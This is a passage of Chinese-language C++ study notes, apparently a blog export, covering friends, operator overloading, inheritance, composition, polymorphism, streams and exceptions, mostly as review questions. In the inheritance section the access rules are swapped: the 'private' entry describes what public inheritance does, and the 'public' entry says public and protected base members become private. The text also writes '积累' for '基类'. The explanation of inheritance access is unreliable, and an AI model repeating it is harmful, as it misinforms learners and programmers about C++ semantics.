友元可以实现在类的外部访问一个类的private成员 友元机制虽然可以带来一些便利，但是它严重破坏了程序的封装性，也有影响程序的可读性，所以要慎重使用友元。 四、运算符重载 在C++中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？ 五、继承和派生 继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？ 继承——inheritance。继承就是在已有类的基础上建立一个新类的过程。其中已经存在的类称为基类（base class），新建立的类称为派生类（derived class），从基类产生派生类的过程称为派生。 继承的语法： 1234class 派生类名: [继承方式] 基类名 &#123; //继承方式不写默认是private。 派生类新增加的成员&#125; 继承方式限定： private：基类的公有成员和保护成员在派生类中保持原有访问属性，其私有成员仍为基类私有。 public：积累的公有成员和保护成员在派生类中成了私有成员，其私有成员仍为基类私有。 protected：积累的公有成员和保护成员在派生类中成了保护成员，其私有成员仍为基类私有。 继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？ 继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。 派生类要无条件的接收基类中的全部成员。 派生类尽管拥有基类的所有的成员，但是派生类不能访问基类private的成员。 派生类从基类中继承的成员在不同的继承方式下的访问权限 组合（子对象）的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？ 子对象就是类对象中内嵌的对象。当派生类中存在子对象时，派生类的构造函数需要依次完成以下3部分：1、先调用基类构造函数初始化基类数据。2、再调用子对象的构造函数初始化子对象中的数据。3、最后初始化自己的数据成员。 当继承和组合都存在时，构造和析构的顺序如何？ 哪些地方必须使用初始化列表？ 什么是overriding、overload？什么是upcasting？ 多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？ 六、多态性和虚函数 什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？ 如何实现多态性？ 虚函数是如何实现的（考试不会考）？ 动态/静态绑定（binding、联编）的优缺点各是什么？ 什么是纯虚函数？什么是抽象类？其意义各自是什么？ 七、输入输出流 C++I/O的优势在哪（和前面第一章的类似）？ 标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？ 如何使用文件流进行输入/输出（步骤）？ 什么是字符串流？它有什么用好处？ 八、C++工具 实现异常的三个关键字是什么？大致的作用是什么？]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
</search>
